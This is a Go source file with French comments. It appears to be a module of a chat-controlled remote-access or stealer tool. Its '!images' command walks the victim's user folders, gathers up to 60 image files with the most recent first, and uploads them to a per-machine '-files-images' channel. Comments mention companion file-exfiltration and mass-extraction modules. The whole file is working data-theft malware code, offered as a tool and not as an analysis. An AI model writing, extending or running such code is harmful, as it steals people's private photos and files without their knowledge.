// images.go — envoi groupé des images du poste.
//
// Le veilleur temps réel (fileexfil.go) n'envoie que les fichiers créés après
// le démarrage, et l'extraction massive plafonne à 400 fichiers. Résultat : un
// dossier Images déjà rempli pouvait ne jamais partir. `!images` prend les
// images des dossiers utilisateur, les plus récentes d'abord, et les envoie
// dans `-files-images`.
package main

import (
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"time"
)

const (
	imagesMaxFiles = 60
	imagesMaxBytes = 120 * 1024 * 1024
)

var imageExts = map[string]bool{
	".jpg": true, ".jpeg": true, ".png": true, ".bmp": true,
	".gif": true, ".webp": true, ".heic": true, ".tif": true, ".tiff": true,
}

type imgFile struct {
	path string
	size int64
	mod  time.Time
}

// bulkImages envoie les images des dossiers utilisateur dans le salon dédié.
func bulkImages() string {
	ch := exfilChannelFor("image.jpg") // résout `<machine>-files-images`
	if ch == "" {
		return "salon images indisponible."
	}
	var list []imgFile
	seen := map[string]bool{}
	for _, root := range exfilRoots() {
		_ = filepath.Walk(root, func(p string, info os.FileInfo, err error) error {
			if err != nil || info == nil {
				return nil
			}
			if skipExfil(p, info) {
				if info.IsDir() {
					return filepath.SkipDir
				}
				return nil
			}
			if info.IsDir() || seen[p] {
				return nil
			}
			if !imageExts[strings.ToLower(filepath.Ext(p))] {
				return nil
			}
			if info.Size() == 0 || info.Size() > exfilMaxBytes {
				return nil
			}
			seen[p] = true
			list = append(list, imgFile{path: p, size: info.Size(), mod: info.ModTime()})
			return nil
		})
	}
	if len(list) == 0 {
		return "aucune image dans les dossiers utilisateur."
	}
	// Les plus récentes d'abord : ce sont celles qui viennent d'être prises.
	sort.Slice(list, func(i, j int) bool { return list[i].mod.After(list[j].mod) })

	sent, bytes := 0, 0
	for _, f := range list {
		if stopped.Load() || sent >= imagesMaxFiles || bytes >= imagesMaxBytes {
			break
		}
		data, err := os.ReadFile(f.path)
		if err != nil {
			continue
		}
		sendFilesTo(ch, fileOut{Name: filepath.Base(f.path), Data: data})
		sent++
		bytes += len(data)
		time.Sleep(500 * time.Millisecond)
	}
	if sent == 0 {
		return "envoi impossible (lecture refusée)."
	}
	return fmt.Sprintf("%d image(s) envoyée(s) dans <#%s> (%d Mo).", sent, ch, bytes/1024/1024)
}
